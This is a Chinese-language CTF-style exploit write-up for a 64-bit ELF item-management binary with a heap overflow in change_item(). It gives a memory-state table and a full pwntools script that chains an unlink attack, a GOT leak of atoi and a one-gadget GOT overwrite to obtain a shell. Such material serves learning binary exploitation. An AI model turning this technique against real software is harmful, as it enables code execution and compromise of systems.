# 漏洞利用文档

## 执行环境
- **程序类型**：64位ELF二进制程序（物品管理程序）
- **安全机制**：
  - Partial RELRO：GOT表可写，便于利用
  - Stack Canary：栈保护启用，但堆漏洞不受影响
  - NX enabled：堆栈不可执行，需通过ROP或代码复用
  - No PIE：代码段地址固定，便于计算偏移
- **依赖库**：依赖libc（通过ldd查看具体版本），使用标准ptmalloc堆管理
- **运行要求**：Linux环境，需要对应架构的libc库

## 漏洞成因
- **关键结构体**：
  ```c
  // 全局数组布局（交替存储）
  itemlist[0x6020c0]: 物品长度数组（每个元素4字节）
  unk_6020C8[0x6020c8]: 物品指针数组（每个元素8字节）
  // 每个物品占用：长度(4B) + 指针(8B) = 16字节
  ```

- **漏洞位置**：`change_item()`函数
- **漏洞代码分析**：
  ```c
  v2 = atoi(nptr); // 用户可控的长度
  read(0, *((void **)&unk_6020C8 + 2 * v1), v2); // 直接使用用户长度读取
  ```
- **漏洞类型**：堆缓冲区溢出
- **根本原因**：程序允许用户重新指定物品名称长度，但未验证新长度是否超过原始malloc分配大小，导致可写入超出原始缓冲区的数据，覆盖相邻堆块元数据

## 漏洞利用过程
利用过程通过堆溢出伪造chunk元数据，结合unlink攻击实现任意地址写，最终覆盖GOT表执行shellcode。

### 内存变化时序表
| 步骤 | 操作 | 堆布局变化 | 全局数组变化 | GOT表变化 | 关键状态 |
|------|------|-------------|---------------|------------|-----------|
| 1 | malloc(0x80×2) | 分配chunk0(0x2f510020)和chunk1(0x2f5100b0) | itemlist[0]=0x80, ptr[0]=0x2f510030<br>itemlist[1]=0x80, ptr[1]=0x2f5100c0 | 无变化 | 堆初始化完成 |
| 2 | change(0,0x90,py1) | chunk0溢出覆盖：<br>- 伪造chunk头(0x81)<br>- fd=0x6020b0, bk=0x6020b8<br>- 覆盖chunk1元数据(prev_size=0x80, size=0x90) | 无直接变化 | 无变化 | 堆元数据伪造完成 |
| 3 | free(1) | chunk1释放，但元数据异常<br>触发unlink修改指针 | ptr[0] = 0x602068 (atoi GOT) | 无变化 | unlink攻击成功 |
| 4 | change(0,len,py2) | chunk0数据被覆盖为py2 | ptr[0]保持指向GOT | 无变化 | 准备泄露libc地址 |
| 5 | puts() | 无直接堆变化 | 无变化 | 无变化 | 泄露atoi地址成功 |
| 6 | 计算onegadget | 无内存变化 | 无变化 | 无变化 | 计算得到0xf03a4偏移 |
| 7 | change(0,0x10,p64) | chunk0写入onegadget地址 | ptr[0]不变 | atoi GOT = onegadget地址 | GOT覆盖完成 |
| 8 | exit() | 进程替换为/bin/dash | 新进程数组 | 新进程GOT | shell执行成功 |

### 堆布局演变示意图
```
初始状态:
[chunk0:0x2f510020] [chunk1:0x2f5100b0] [top_chunk]

溢出后:
[chunk0:伪造元数据+溢出数据] [chunk1:元数据被破坏] [top_chunk]

利用后:
[进程被替换为/bin/dash，新堆布局]
```

## Exploit
```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample8')
p = process('./data/sample8')
libc = elf.libc

# 工具函数定义
sl = lambda s : p.sendline(s.encode() if isinstance(s, str) else s)
sd = lambda s : p.send(s.encode() if isinstance(s, str) else s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s.encode() if isinstance(s, str) else s)
ti = lambda : p.interactive()

def malloc(size, content):
    ru("Your choice:")
    sl('2')
    ru("Please enter the length of item name:")
    sd(str(size))
    ru("Please enter the name of item:")
    sd(content)

def free(index):
    ru("Your choice:")
    sl('4')
    ru("Please enter the index of item:")
    sl(str(index))

def exit():
    ru("Your choice:")
    sl('5')

def puts():
    ru("Your choice:")
    sl('1')

def change(index, size, content):
    ru("Your choice:")
    sl('3')
    ru("Please enter the index of item:")
    sd(str(index))
    ru("Please enter the length of item name:")
    sd(str(size))
    ru("Please enter the new name of the item:")
    sd(content)

# Step 1: 分配两个堆块建立攻击面
malloc(0x80, b'aaaa')  # 分配chunk0，原始大小为0x80
malloc(0x80, b'bbbb')  # 分配chunk1，作为溢出目标

# Step 2: 堆溢出伪造chunk元数据
FD = 0x6020c8 - 3*8  # 计算unlink攻击的fd指针（指向全局数组附近）
BK = FD + 8          # bk指针
# 构造溢出payload：伪造free chunk + 覆盖相邻chunk元数据
py1 = p64(0) + p64(0x81) + p64(FD) + p64(BK) + b"a"*0x60 + p64(0x80) + p64(0x90)
change(0, 0x90, py1)  # 关键：指定长度0x90 > 原始0x80，触发堆溢出

# Step 3: 释放chunk1触发unlink攻击
free(1)  # 释放被破坏元数据的chunk1，触发unlink修改全局指针

# Step 4: 修改指针指向GOT表
atoi_got = elf.got["atoi"]  # 获取atoi的GOT地址
py2 = b'a'*24 + p64(atoi_got)  # 构造payload覆盖指针
change(0, len(py2), py2)  # 修改chunk0数据，使指针指向GOT

# Step 5: 泄露libc地址
puts()  # 调用puts显示GOT内容，泄露atoi地址
atoi_addr = u64(ru(b'\n--')[4:10].ljust(8, b'\x00'))  # 解析泄露的地址

# Step 6: 计算one-gadget地址
onegadget = atoi_addr - libc.symbols["atoi"] + 0xf03a4  # 计算one-gadget偏移

# Step 7: 覆盖GOT表实现任意代码执行
change(0, 0x10, p64(onegadget))  # 将one-gadget地址写入GOT

# Step 8: 触发漏洞执行
exit()  # 调用exit触发atoi，执行one-gadget获得shell

# Step 9: 交互模式
p.interactive()  # 进入shell交互
```

### 关键利用技术说明
1. **堆溢出**：利用change_item的长度验证缺失，覆盖相邻chunk元数据
2. **Unlink攻击**：伪造chunk的fd/bk指针，在free时触发unlink修改全局指针
3. **GOT劫持**：通过修改的物品指针实现任意地址写，覆盖GOT表项
4. **One-gadget**：使用libc中的one-gadget直接获得shell，避免复杂ROP

此利用在Partial RELRO+No PIE环境下有效，实际利用时需根据libc版本调整one-gadget偏移。
